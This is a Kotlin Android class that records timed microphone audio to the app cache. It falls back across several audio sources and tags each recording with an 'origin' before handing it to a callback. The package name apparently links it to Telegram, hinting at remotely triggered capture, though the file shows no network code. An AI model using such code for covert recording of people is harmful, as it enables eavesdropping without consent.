package com.kashem.shaikh.telegram

import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.util.Log
import kotlinx.coroutines.*
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class AudioRecorderManager(
    private val context: Context,
    private val onAudioRecorded: (File, String) -> Unit  // 🆕 অরিজিন প্যারামিটার
) {
    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var currentFile: File? = null
    private var stopJob: Job? = null
    private var currentOrigin: String = "user"  // 🆕
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    fun setMediaProjection(resultCode: Int, data: Intent) {}

    fun startExternalRecording(durationSeconds: Int, origin: String = "user") {
        if (isRecording) return
        currentOrigin = origin

        val outputDir = File(context.cacheDir, "audio")
        if (!outputDir.exists()) outputDir.mkdirs()
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(System.currentTimeMillis())
        currentFile = File(outputDir, "audio_$timestamp.3gp")

        var started = false
        val sources = listOf(
            MediaRecorder.AudioSource.MIC,
            MediaRecorder.AudioSource.VOICE_RECOGNITION,
            MediaRecorder.AudioSource.DEFAULT
        )
        for (source in sources) {
            if (tryStartRecording(source)) {
                started = true
                break
            }
        }

        if (!started) {
            Log.e("AudioRecorder", "All audio sources failed")
            return
        }

        stopJob = scope.launch {
            delay(durationSeconds * 1000L)
            stopRecording()
        }
    }

    private fun tryStartRecording(audioSource: Int): Boolean {
        return try {
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(audioSource)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(currentFile?.absolutePath)
                prepare()
                start()
                isRecording = true
                Log.d("AudioRecorder", "Started with source=$audioSource")
            }
            true
        } catch (e: Exception) {
            Log.e("AudioRecorder", "Failed source=$audioSource: ${e.message}")
            mediaRecorder = null
            false
        }
    }

    fun startInternalRecording(durationSeconds: Int) {
        Log.w("AudioRecorder", "Internal recording not supported")
    }

    fun stopRecording() {
        if (!isRecording) return
        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
            isRecording = false
            mediaRecorder = null
            stopJob?.cancel()
            currentFile?.let { file ->
                if (file.exists() && file.length() > 0) {
                    Log.d("AudioRecorder", "File size: ${file.length()} bytes")
                    onAudioRecorded(file, currentOrigin)  // অরিজিন পাস
                } else {
                    file.delete()
                }
            }
        } catch (e: Exception) {
            Log.e("AudioRecorder", "Stop error: ${e.message}")
        }
    }

    fun release() {
        stopRecording()
        scope.cancel()
    }
}